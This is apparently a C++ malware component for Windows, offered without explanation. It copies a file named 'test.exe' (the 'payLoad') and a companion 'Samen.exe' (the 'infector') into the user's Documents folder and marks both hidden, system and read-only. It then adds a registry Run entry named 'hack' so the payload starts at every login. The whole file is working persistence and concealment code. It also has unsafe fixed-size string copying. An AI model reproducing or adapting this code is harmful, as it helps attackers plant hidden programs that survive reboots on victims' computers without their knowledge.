#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <shlobj.h>

const std::string current_File_Dir = std::filesystem::current_path().string(); 
const char* payLoad = "\\test.exe";
const char* infector = "\\Samen.exe";

const char* fileInjector(int argv, char* args[], const char* hiddenPath) {
    char* src = new char[100];
    char* src2 = new char[100];
    char* dest = new char[100];
    char* dest2 = new char[100];

    strcpy(src, current_File_Dir.c_str()); 
    strcat(src, payLoad);
    //std::cout << src << std::endl;
    strcpy(src2, current_File_Dir.c_str());
    strcat(src2, infector);
    //std::cout << src << std::endl;


    strcpy(dest, hiddenPath); 
    strcat(dest, payLoad);
    //std::cout << dest << std::endl;
    strcpy(dest2, hiddenPath); 
    strcat(dest2, infector);
    //std::cout << dest << std::endl;

    CopyFile( src, dest, 0);
    CopyFile( src2, dest2, 0);

    SetFileAttributes(dest,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
    SetFileAttributes(dest2,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);

    return dest;
}

int StartupInjector(const char* exeLocation) {
    HKEY hkey = NULL;

    // startup
    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        // create new registry key
        RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exeLocation, strlen(exeLocation));
        RegCloseKey(hkey);
    }
  return 0;
}


int main(int argv, char* args[]) {
    char saveLocation[MAX_PATH] = {0};
    SHGetSpecialFolderPath(NULL, saveLocation, CSIDL_PERSONAL, FALSE);
    const char* exeLocation = fileInjector(argv, args, saveLocation);
    StartupInjector(exeLocation); 
    return 0;
}